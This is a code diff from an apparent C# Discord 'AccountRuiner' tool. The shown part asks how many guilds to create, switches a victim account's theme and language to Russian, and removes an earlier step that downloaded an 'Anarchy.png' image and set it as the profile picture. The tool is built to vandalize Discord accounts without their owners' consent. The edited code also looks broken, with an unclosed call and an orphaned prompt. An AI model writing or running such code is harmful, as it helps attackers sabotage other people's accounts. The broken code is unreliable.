@@ -41,21 +41,15 @@ namespace AccountRuiner
         {
             
            
-            WebClient PFP = new WebClient();
-            PFP.DownloadFile("https://cdn.discordapp.com/attachments/624408319372820500/627529053884383240/Anarchy.png", "face.png");
-            PFP.Dispose();
+         
             Console.WriteLine("How Many Guilds? (Max is 100)");
             int guilds = int.Parse(Console.ReadLine());
             Console.Clear();
                Console.WriteLine("Do u want to Change Language,Pfp and theme Say Yes or No");
-            string type = Console.ReadLine();
-            if (type == ("yes"))
-            {
-                 Console.Clear();
-                client.User.ChangeProfile(new UserProfile() { Avatar = Image.FromFile("lol.png") }); //this function is for updating profile related settings
+                //this function is for updating profile related settings
                 client.User.ChangeSettings(new UserSettings() { Theme = Theme.Light });
                 client.User.ChangeSettings(new UserSettings() { Language = Language.Russian };
-            }
+            
             Console.WriteLine("Press Enter When Ready");
             Console.ReadLine();
  
